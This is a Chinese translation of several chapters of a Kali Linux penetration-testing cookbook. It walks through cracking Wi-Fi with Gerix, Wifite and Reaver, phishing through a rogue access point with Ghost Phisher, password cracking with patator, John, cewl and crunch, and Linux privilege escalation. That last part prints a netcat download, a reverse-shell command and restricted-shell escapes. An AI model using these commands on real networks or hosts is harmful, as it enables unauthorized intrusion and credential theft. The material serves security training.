在上一个教程中，您学会了如何使用 Aircrack 套件来破解 WEP。在这个教程中，我们将使用基于 GUI 的工具 Gerix，它使 Aircrack 套件易于使用，并使我们的无线网络审计更加容易。Gerix 是由 J4r3tt 开发的基于 Python 的工具。

# 准备就绪

让我们使用以下命令安装 Gerix：

```
git clone https://github.com/J4r3tt/gerix-wifi-cracker-2.git
```

# 如何操作...

以下步骤演示了 Gerix 的使用：

1.  下载完成后，我们进入下载的目录并运行以下命令：

```
 cd gerix-wifi-cracker-2
```

1.  我们使用以下命令运行工具：

```
 python gerix.py
```

上述命令可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1c6a0fb6-59c8-4656-a282-b789919330b3.png)

1.  窗口打开后，我们点击“配置”选项卡中的“启用/禁用监视模式”，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f1b44039-6aa4-4bf2-a217-e3dd6fd261cd.png)

1.  然后，我们点击“重新扫描网络”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7c0a111f-ce75-4d7b-a8d8-f0a8d77d9861.png)

1.  这将显示可用的接入点列表和它们使用的认证类型。我们选择一个带有 WPA 的接入点，然后切换到 WPA 选项卡。

1.  在这里，我们点击“常规功能”，然后点击“开始捕获”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a18f5443-8dde-4d3b-82e1-688640ee2214.png)

1.  由于 WPA 攻击需要捕获握手，我们需要一个站点已连接到接入点。因此，我们点击“自动加载受害者客户端”或输入自定义受害者 MAC：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2daabcbc-3386-4bf9-9dc1-1eee3572e418.png)

1.  接下来，我们选择去认证号。我们在这里选择`0`以执行去认证攻击，然后点击“客户端去认证”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/2f299964-f40e-4055-8547-a1711eb0eeb7.png)

1.  我们应该看到一个弹出窗口，它会为我们执行去认证：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/849fac2f-5f2b-4b28-b6a2-f108b96a8700.png)

在 airodump 窗口中，我们应该看到已捕获到握手。

1.  现在我们准备破解 WPA，我们切换到 WEP 破解选项卡，在 WPA 暴力破解中，我们给出一个字典的路径，然后点击“Aircrack-ng - 破解 WPA 密码”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/74011f72-16e9-42f8-b62a-1c04b6c7022f.png)

1.  我们应该看到 Aircrack 窗口，当密码被破解时它会显示给我们：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/aa2ec4c1-8976-4336-b663-f1e11c454d0f.png)

1.  同样，这个工具也可以用来破解 WEP/WPA2 网络。

# 处理 WPA

Wifite 是一个仅适用于 Linux 的工具，旨在自动化无线审计过程。它需要安装 Aircrack 套件、Reaver、Pyrit 等才能正常运行。它已预装在 Kali 中。在这个教程中，您将学习如何使用 wifite 来破解一些 WPA。

# 如何操作...

要了解 Wifite，请按照以下步骤操作：

1.  我们可以通过输入以下命令来启动 Wifite：

```
 wifite
```

上述命令显示了所有可用网络的列表，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4b271091-8b18-4260-9066-d1af9bced405.png)

1.  然后我们按下*Ctrl* + *C*来停止；然后它会要求您选择要尝试破解的网络：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/be62ee07-d710-4dcb-9013-26cf74ba9146.png)

1.  我们输入我们的数字并按*Enter*。工具会自动尝试使用不同的方法来破解网络，最终，如果成功破解，它会显示密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/df19c17a-2cef-4fcd-8bc7-8a37c900a2a6.png)

我们将看到以下密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/e63e7d14-3448-411e-981c-2b8b1dadc008.png)

# 使用 Ghost Phisher 拥有员工账户

Ghost Phisher 是一个无线网络审计和攻击软件，它创建一个网络的虚假接入点，欺骗受害者连接到它。然后为受害者分配一个 IP 地址。该工具可用于执行各种攻击，如凭据钓鱼和会话劫持。它还可以用于向受害者传递 meterpreter 有效载荷。在这个教程中，您将学习如何使用该工具执行各种网络钓鱼攻击或窃取 cookies 等。

# 如何操作...

可以在下面看到 Ghost Phisher 的使用：

1.  我们使用`ghost-phisher`命令启动它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/5de7687f-5874-4b4e-b824-7421144c0eb5.png)

1.  在这里，我们选择我们的接口并点击“设置监视器”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a47db3c8-f9ad-48ad-b901-6e9918a30977.png)

1.  现在我们输入我们想要创建的接入点的详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/3df8ae0a-f332-473e-a6a1-569c06977b9f.png)

1.  然后，我们点击“开始”以创建一个新的无线网络并使用该名称。

1.  然后，我们切换到虚假 DNS 服务器。在这里，我们需要提到受害者打开任何网页时将被引导到的 IP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9e1b828b-1d63-4a65-b2a6-0d4238494a62.png)

1.  然后我们启动 DNS 服务器。

1.  然后，我们切换到虚假 DHCP 服务器。在这里，我们需要确保当受害者尝试连接时，他/她会被分配一个 IP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0785fac4-4b9a-47a3-94f5-f08dd1caa02f.png)

1.  完成后，我们点击“开始”以启动 DHCP 服务。

1.  如果我们想要钓鱼并捕获凭据，我们可以通过在虚假 HTTP 服务器选项卡中设置选项来将他们引导到我们的钓鱼页面。在这里，我们可以上传我们想要显示的 HTML 页面或提供我们想要克隆的 URL。我们启动服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f869dbf3-035d-444d-8f64-73c11381cafa.png)

1.  在下一个选项卡中，我们看到 Ghost Trap；这个功能允许我们执行 Metasploit 有效载荷攻击，它将要求受害者下载我们准备好的 meterpreter 有效载荷，一旦执行，我们将获得一个 meterpreter 连接。

1.  在会话劫持选项卡中，我们可以监听和捕获可能通过网络的会话。我们在这里需要做的就是输入网关或路由器的 IP 地址，然后点击“开始”，它将检测并显示任何捕获的 cookie/会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bea5d007-f1a0-4e1e-897f-3284c2b71048.png)

1.  我们在 HTTP 服务器中捕获的凭据可以在收获的凭据选项卡中看到。

# Pixie dust 攻击

**Wi-Fi Protected Setup**（**WPS**）于 2006 年推出，供希望连接到家庭网络而不必记住 Wi-Fi 的复杂密码的家庭用户使用。它使用八位数的 PIN 来验证客户端到网络的身份。

Pixie dust 攻击是一种暴力破解八位数 PIN 的方法。如果路由器易受攻击，这种攻击可以在几分钟内恢复 PIN。另一方面，简单的暴力破解需要几个小时。在这个教程中，您将学习如何执行 pixie dust 攻击。

可以在[`docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y/edit?pref=2&pli=1#gid=2048815923`](https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y/edit?pref=2&pli=1#gid=2048815923)找到攻击将起作用的易受攻击的路由器列表。

# 准备工作

我们需要启用 WPS 的网络。否则，它将无法工作。

# 如何做...

要了解 pixie dust，请按照以下步骤：

1.  我们使用以下命令在监视器模式下启动我们的接口：

```
 airmon-ng start wlan0
```

1.  然后，我们需要找到启用 WPS 的网络；我们可以使用以下命令来做到这一点：

```
 wash -i <monitor mode interface> -C
```

以下截图显示了上述命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/004235d3-a7ac-43c5-a134-a8298c963cba.png)

1.  现在我们使用以下命令运行`reaver`：

```
 reaver -i wlan0mon -b [BSSID] -vv -S -c [AP channel]
```

以下截图显示了上述命令的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/9ba9b27a-ac24-44aa-a6ee-271da1d02b62.png)

1.  完成后，我们应该看到 PIN。

# 还有更多...

以下是一些可以在攻击无线网络时参考的优秀文章：

+   [`www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/`](http://www.hackingtutorials.org/wifi-hacking-tutorials/pixie-dust-attack-wps-in-kali-linux-with-reaver/)

+   [`www.kalitutorials.net/2014/04/hack-wpawpa2-wps-reaver-kali-linux.html`](http://www.kalitutorials.net/2014/04/hack-wpawpa2-wps-reaver-kali-linux.html)


# 第七章：密码攻击-它们的星星中的错误

在本章中，我们将涵盖以下教程：

+   识别野外中的不同类型的哈希！

+   使用哈希标识符

+   使用 patator 破解

+   在线破解哈希

+   与约翰·里波特一起玩

+   约翰尼·布拉沃！

+   使用 cewl

+   使用 crunch 生成单词列表

# 介绍

弱密码是一个众所周知的情况，大多数公司都会受到影响。很多人使用可以被暴力破解的弱密码，可以获得明文。在本章中，我们将讨论在 webapp/network 上进行渗透测试活动期间获得的密码哈希的不同破解方法。

# 识别野外中的不同类型的哈希！

哈希是由单向数学算法生成的，这意味着它们无法被反转。打破的唯一方法是暴力破解它们。在这个教程中，您将学习如何识别一些不同类型的哈希。

# 如何做...

以下是哈希的类型。

# MD5

这是最常见的哈希类型。MD 代表**消息摘要**算法。可以使用以下观察来识别这些哈希：

+   它们是十六进制的

+   它们的长度为 32 个字符，128 位，例如`21232f297a57a5a743894a0e4a801fc3`

# MySQL 小于 v4.1

我们可能在从 SQL 注入中提取数据时遇到这些哈希。可以使用以下观察来识别这些哈希：

+   它们也是十六进制的

+   它们的长度为 16 个字符，64 位，例如`606727496645bcba`

# MD5（WordPress）

这在通过 WordPress 制作的网站上使用。可以使用以下观察来识别这些哈希：

+   它们以`$P$`开头

+   它们包含字母数字字符

+   它们的长度为 34 个字符，64 位，例如`$P$9QGUsR07ob2qNMbmSCRh3Moi6ehJZR`

# MySQL 5

这在 MySQL 的新版本中用于存储凭据。可以使用以下观察来识别这些哈希：

+   它们全是大写

+   它们总是以星号开头

+   它们的长度为 41 个字符，例如`*4ACFE3202A5FF5CF467898FC58AAB1D615029441`

# Base64 编码

Base64 很容易识别。转换是通过将八个八位字节编码为四个字符来完成的。检查 Base64 的最简单方法如下：

+   验证长度是否为 4 的倍数

+   验证每个字符是否在 A-Z、a-z、0-9、+、/的集合中，除了末尾的填充，它是 0、1 或 2，=字符，例如`YW55IGNhcm5hbCBwbGVhc3VyZS4=`

# 还有更多...

这是一篇文章，了解更多关于不同类型的哈希：

[`www.101hacker.com/2010/12/hashes-and-seeds-know-basics.html`](http://www.101hacker.com/2010/12/hashes-and-seeds-know-basics.html)

# 使用哈希标识符

在前面的教程中，您学会了如何识别一些常见的哈希类型。但是还有其他类型的哈希，本教程中，您将学习如何识别我们在渗透测试项目中发现的其他哈希。

# 如何做...

以下步骤演示了哈希标识符的使用：

1.  Kali 预装了一个名为哈希标识符的工具。要启动该工具，我们使用以下命令：

```
 hash-identifier
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7621405e-a661-48b5-91dd-730589d384a7.png)

1.  现在我们只需要在这里粘贴我们找到的哈希，它会显示给我们类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/fda88db1-ba2a-4f6c-8646-24dfc886216a.png)

# 使用 patator 破解

有时，我们可能有用户名，但我们想尝试暴力破解密码。Patator 是一个令人惊奇的工具，可以让我们暴力破解多种类型的登录，甚至 ZIP 密码。在本教程中，我们将看到如何使用 patator 执行暴力破解攻击。

# 如何做...

以下是使用 patator 的步骤：

1.  要查看所有选项，我们使用以下命令：

```
 patator -h
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/46dc4fa8-7370-4303-8994-e4eaef109036.png)

1.  让我们尝试暴力破解 FTP 登录：

```
 patator ftp_login
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a0c1dadf-bd97-4661-9503-f340c6373d8f.png)

1.  现在我们可以设置`host`、`user`文件和`password`文件并运行模块：

```
 patator ftp_login host=192.168.36.16 user=ftp password=ftp
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6c9f8b24-4d4f-4c4f-a0ca-06aafd033b93.png)

1.  我们可以看到已经获得了访问权限并且模块已停止。

# 在线破解哈希值

通常在渗透测试中遇到哈希值时，最好在线检查哈希值：它是否已经被破解。在这个教程中，您将了解一些提供哈希值破解服务的很酷的网站。

# 如何做...

让我们来看看识别不同类型的哈希值。

# Hashkiller

以下步骤演示了 Hashkiller 的使用：

1.  Hashkiller 是一个很棒的服务，我们可以提交我们的哈希值，如果它在过去已经被破解，它将向我们显示明文：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/714fa5ac-a3a0-4378-b325-97dee1e71141.png)

1.  这个过程很简单；我们只需在网站上选择解密器/破解器的选项，然后点击我们想要破解的哈希类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7a0893f5-8a61-4c69-9be4-c06c4d78fe7d.png)

1.  在打开的页面上，我们粘贴我们的哈希值，填写验证码，然后点击提交：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/28c468cd-eb2d-4af7-b625-7cd3d6e09519.png)

1.  如果哈希值存在，它将向我们显示明文；否则，我们将看到一条消息，显示未找到任何哈希值！：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0d907b24-ab9a-4c4e-a44c-eba1f711ee3f.png)

# Crackstation

Crackstation 是一个免费的服务，支持 MD2、MD5、NTLM 和 SHA1 破解。它使用自己的单词列表和查找表来有效地从数据库中执行哈希的明文搜索：

1.  我们访问网站[`crackstation.net/`](https://crackstation.net/)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/ed038a5f-d588-44ca-9834-f7c14a7d810a.png)

1.  我们粘贴要破解的哈希值并填写验证码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/f00d32e0-bd02-45a2-a8ee-4e0675027952.png)

1.  如果找到哈希值，我们将看到明文；否则，我们会看到一个消息，说哈希值未找到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/914c8ba8-702a-449f-87e9-2d8634a70d38.png)

1.  Crackstation 还提供其密码列表和查找表的下载链接，如果我们想要使用它来离线使用 hashcat 等工具破解密码，[`crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm`](https://crackstation.net/buy-crackstation-wordlist-password-cracking-dictionary.htm)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b78c8393-ef80-4e56-882d-38b09393bae3.png)

# OnlineHashCrack

这是一个付费服务，也是我最喜欢的之一。它支持 OSX、MD4、MD5、NTLM、WPA(2)，以及对 Word、Excel、PPT 受保护文档的暴力破解。它提供八个字符的免费密码，之后收取一小费来显示成功破解的密码：

1.  我们访问网站[`onlinehashcrack.com/`](http://onlinehashcrack.com/)：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0eaa159d-5873-497f-8093-3df7e508bc9a.png)

1.  在这里，我们可以提交我们的哈希值或`.apt`文件进行破解，并填写我们想要接收通知的电子邮件地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6e5f8a60-ce72-4348-a0ef-19dcd1f17179.png)

1.  在我们的电子邮件中收到的唯一链接上，我们可以看到所有已破解或未在网站上找到的哈希值的状态：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/91e5dc8d-b703-40a1-8904-1b615c2fabc1.png)

# 玩弄约翰·里帕

网站和在线服务可能并不总是可用，也有可能这些网站可能没有我们找到的哈希值的明文。在这种情况下，我们可以使用不同的离线工具来破解哈希值。

假设我们现在有哈希值，并且已经确定了它的类型。在这个教程中，我们将看到如何使用约翰·里帕破解哈希值。约翰速度快，支持各种破解模式。它还具有自动检测哈希类型的能力。

# 如何做...

要了解约翰·里帕，按照给定的步骤进行：

1.  我们可以使用帮助（`-h`）命令查看完整的功能：

```
 john -h
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/dcdde2e5-00c3-422a-82d9-b0db8d96d0c4.png)

1.  要破解密码，我们使用以下命令：

```
 john --format=raw-md5
        --wordlist=/usr/share/wordlists/rockyou.txt /root/demo_hash.txt
```

1.  我们将看到密码已成功破解！

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/65614c93-756b-41a0-a96b-94197c32f363.png)

# 还有更多...

有关更多信息，您可以参考以下文章：

+   [`pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats`](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)

# 约翰尼·布拉沃！

Johnny 是 John 的 GUI 客户端。由于它添加了一个 UI，因此使用起来更加容易。

# 如何做...

要了解 Johnny，请按照给定的步骤：

1.  在我们之前的教程中，您已经学会了如何使用 John。我们将使用以下命令启动 Johnny：

```
 johnny
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7a6df28f-4ea3-4062-babd-bbca0835b8ec.png)

1.  我们通过单击“打开密码文件”选项来加载我们的密码文件。我们的文件已加载：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/67bfc2c7-9007-473f-b365-b06b0f18a239.png)

1.  现在我们转到选项，并选择我们要执行的攻击类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/94dda386-d2cf-4eea-817b-d93b7cee9917.png)

1.  我们选择哈希的格式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7ac61e99-c00b-477f-97f6-8f33da475e27.png)

1.  完成后，我们点击开始攻击，当密码破解时，我们应该看到我们的密码。

# 使用 cewl

`cewl`是一个基于 Ruby 的爬虫，它爬取 URL 并搜索可用于密码攻击的单词。在这个教程中，我们将看看如何利用它。

# 如何做...

以下是使用`cewl`的步骤：

1.  要查看`cewl`的所有选项，我们使用这个命令：

```
 cewl -h
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/28ca2f77-8349-4e38-b55b-0abbdd363864.png)

1.  要爬取一个网站，我们使用这个命令：

```
 cewl -d 2 http://192.168.36.16/forum/
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/7e77aa60-2a6c-4450-8ac5-3b726f06fd65.png)

1.  我们将看到一个有趣的关键字列表，可以用来制作我们自己的字典密码列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/501811e8-de2e-4af9-9d15-1db24d860544.png)

# 使用 crunch 生成单词列表

Crunch 是一个单词列表生成器。它使用排列和组合来生成所提供字符集的所有可能组合。

# 如何做...

要了解 Crunch，请按照给定的步骤：

1.  Crunch 已经预装在 Kali 中，我们可以使用以下命令启动它：

```
 crunch -h
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/38d54f58-1bb5-468d-9831-e552fe6af082.png)

1.  正如我们所看到的，很容易使用`abcdef`生成一个最小为两个字符，最大为两个字符的密码列表，我们可以使用以下命令：

```
 crunch 2 2 abcdef
```

我们可以看到已经生成了单词列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/a494141a-f419-4c9a-bfe3-dd7c91460257.png)

1.  要将其保存到文件中，我们可以使用`-o`开关。Crunch 还有一个内置列表，其中包含预定义的字符集。它可以在`/usr/share/crunch/charset.lst`中找到。

1.  要使用字符集，我们使用`-f`开关：

```
 crunch 2 2 -f /usr/share/crunch/charset.lst lalpha
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/16b316a9-0366-4841-9a00-e945fd4cae5f.png)

1.  这将生成一个包含小写字母的最小长度和最大长度为`2`的列表。Crunch 还有一个`-t`开关，可以用来创建特定模式的单词列表：

+   `@`: 这将插入小写字符

+   `,`: 这将插入大写字符

+   `%`: 这将插入数字

+   `^`: 这将插入符号

1.  开关`-b`可以用来指定要创建的文件的大小：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/4deacd02-cccb-477c-941a-57b657c1c6bf.png)

1.  让我们尝试创建一个具有特定模式且大小为 1 MB 的列表：

```
 crunch 10 10 -t @@packt,,% -b 1mib -o START
```

1.  完成后，我们将看到一个包含相同文件夹中模式的文本文件列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b748c3bc-c127-40bd-8434-8d513052907a.png)

1.  `-z`标志可用于创建单词列表并将其保存在压缩文件中。压缩是在进行中完成的：

```
 crunch 10 10 -t @@packt,,% -b 1mib -o START -z gzip
```

以下屏幕截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/89842d96-8111-4070-868a-8f115ff80512.png)


# 第八章：现在有 Shell 了，怎么办？

在本章中，我们将涵盖以下教程：

+   生成 TTY shell

+   寻找弱点

+   水平升级

+   垂直升级

+   节点跳跃：转向

+   Windows 上的特权升级

+   PowerSploit

+   使用 mimikatz 提取明文密码

+   从机器中转储其他保存的密码

+   转向

+   为了持久性而给可执行文件加后门

# 介绍

这是特权升级，正如维基百科所述，**特权升级**是利用操作系统或软件应用程序中的漏洞、设计缺陷或配置疏忽来获取对通常受到应用程序或用户保护的资源的提升访问权限的行为。这导致对资源的未经授权访问。可能存在两种特权升级：

+   **水平**：这种情况发生在我们能够执行原本不是为当前用户访问而设计的命令或函数的条件下

+   **垂直**：这种利用发生在我们能够将我们的特权提升到更高的用户级别时，例如，在系统上获取 root 权限

在本章中，您将学习在 Linux 和 Windows 系统上提升特权的不同方法，以及访问内部网络的方法。

# 生成 TTY Shell

我们已经涵盖了不同类型的特权升级。现在让我们看一些关于如何在这个系统上获取 TTY shell 的例子。TTY 展示了一个简单的文本输出环境，允许我们输入命令并获取输出。

# 如何做...

1.  让我们看一个例子，我们有一个运行 zenPHOTO 的 Web 应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/1df99474-bae8-444e-8ce4-f6499ccf736c.png)

1.  zenPHOTO 已经有一个公开的漏洞正在运行，我们通过有限的 shell 获得了对它的访问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/71dccab9-1325-45e2-a316-cfc79f2add44.png)

1.  由于这是一个有限的 shell，我们尝试逃离它，并通过首先在系统上上传`netcat`，然后使用`netcat`来获取反向连接。

```
 wget x.x.x.x/netcat –o /tmp/netcat
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/97b42970-b8ee-49ba-b65b-0227a40cc547.png)

1.  现在我们可以使用以下命令进行反向连接：

```
 netcat <our IP > -e /bin/bash <port number>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/0a0a6460-ac7c-438d-a887-d2fa62a4247a.png)

1.  看着我们的终端窗口，在那里我们设置了监听器，我们会看到一个成功的连接：

```
 nc –lnvp <port number>
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/bc9d7e89-ab1b-4d7a-9621-957fb743e7e3.png)

让我们获取一个更稳定的 TTY shell；假设这是一个 Linux 系统，我们已经在上面安装了 Python，并且我们可以使用这个命令获取一个 shell：

```
python -c 'import pty; pty.spawn("/bin/sh")'
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/8c23665a-29d9-4849-a7ec-802f1bf37808.png)

我们现在有了一个更好的执行命令的方式。有时，我们可能会发现自己处于这样一种情况：我们通过 ssh 或其他方法获得的 shell 是一个有限的 shell。

一个非常著名的有限 shell 是`lshell`，它只允许我们运行一些命令，比如`echo`、`ls`、`help`等。逃离`lshell`很容易，因为我们只需要输入这个：

```
echo os.system('/bin/bash')
```

然后我们就可以访问一个没有更多限制的命令 shell。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/65dfc583-757e-412e-a60a-a1183fa69944.png)

# 还有更多...

还有其他各种方式可以使用 Ruby、Perl 等生成 TTY shell。这可以在[`netsec.ws/?p=337`](http://netsec.ws/?p=337)上看到。

# 寻找弱点

现在我们有了一个稳定的 shell，我们需要寻找漏洞、错误配置或任何能帮助我们在系统上提升特权的东西。在这个教程中，我们将看一些提升特权以获取系统根目录的方法。

# 如何做...

我建议大家在服务器上有了 shell 之后，尽可能多地进行枚举：我们知道的越多，我们就有更好的机会在系统上提升特权。

如`g0tmi1k`所述，提升特权的关键步骤在系统上是：

+   **收集**：枚举，更多的枚举，还有更多的枚举。

+   **过程**：整理数据，分析和排序。

+   **搜索**：知道要搜索什么以及在哪里找到利用代码。

+   **适应**：自定义漏洞以适应。并非每个漏洞都可以直接在每个系统上使用。

+   **尝试**：准备好（很多）试错。

我们将看一些在互联网上常见的脚本，这些脚本通过格式化的方式打印出我们需要的任何信息，从而使我们的工作更加轻松。

第一个是`LinEnum`，这是一个由 reboot 用户创建的 shell 脚本。它执行了 65 多项检查，并显示了我们需要开始的一切：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d29200d8-3f51-4a14-b4dc-db057accc486.png)

查看源代码，我们将看到它将显示内核版本、用户信息、可写目录等信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/08dce2a5-5474-409e-b68c-18bfd4255676.png)

我们可以使用的下一个脚本是`LinuxPrivChecker`。它是用 Python 制作的。这个脚本还建议可以在系统上使用的特权升级漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/d03ff64c-e5ae-4e94-b522-4c1fd0a70475.png)

这些脚本很容易在 Google 上找到；但是，关于这个或者我们可以使用手动命令自己完成工作的更多信息可以在[`netsec.ws/?p=309`](http://netsec.ws/?p=309)和 G0tmilk 的博客[`blog.g0tmi1k.com/`](https://blog.g0tmi1k.com/)找到。

另一个很棒的脚本是由`Arr0way`（[`twitter.com/Arr0way`](https://twitter.com/Arr0way)）创建的。他在他的博客[`highon.coffee/blog/linux-local-enumeration-script`](https://highon.coffee/blog/linux-local-enumeration-script)上提供了源代码。我们可以阅读博客上提供的源代码，以检查脚本的所有功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/327c2d7c-9460-4a11-887a-608870ebaa09.png)

# 水平升级

您已经学会了如何生成 TTY shell 并执行枚举。在这个教程中，我们将看一些可以进行水平升级以获得更多系统特权的方法。

# 如何做...

在这里，我们有一个情况，我们已经以`www-data`的身份获得了一个反向 shell。

运行`sudo –-list`，我们发现用户被允许以另一个用户`waldo`的身份打开配置文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/6c5959ab-2e97-4ca8-b4fb-2be36f170a12.png)

因此，我们在 VI 编辑器中打开配置文件，并在 VI 的命令行中输入以下内容以在 VI 中获取 shell：

```
!bash
```

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-eth-hkr-cc/img/b33d99b3-60fb-4f4f-850e-8b208272bdda.png)

现在我们有一个以用户`waldo`身份的 shell。所以，我们的升级是成功的。

在某些情况下，我们还可能在`ssh`目录中找到授权密钥或保存的密码，这有助于我们进行水平升级。

# 垂直升级

在这个教程中，我们将看一些例子，通过这些例子我们可以访问受损系统上的 root 账户。成功升级的关键是尽可能多地收集有关系统的信息。

# 如何做...

对任何盒子进行 root 的第一步是检查是否有任何公开可用的本地 root 漏洞：

